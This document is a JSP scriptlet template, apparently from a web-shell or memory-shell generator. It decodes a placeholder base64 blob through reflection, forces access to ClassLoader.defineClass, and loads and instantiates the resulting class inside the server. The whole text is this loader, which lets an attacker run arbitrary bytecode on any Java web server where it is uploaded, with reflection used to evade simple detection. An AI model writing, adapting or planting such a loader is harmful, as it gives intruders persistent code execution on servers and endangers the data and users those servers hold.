<%
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    try {
        Class base64Clz = classLoader.loadClass("java.util.Base64");
        Class decoderClz = classLoader.loadClass("java.util.Base64$Decoder");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(base64Clz);
        bytecode = (byte[]) decoderClz.getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException e) {
        Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(datatypeConverterClz, base64Str);
    }
    java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    Class clazz = (Class) defineClass.invoke(classLoader, bytecode, 0, bytecode.length);
    clazz.newInstance();
%>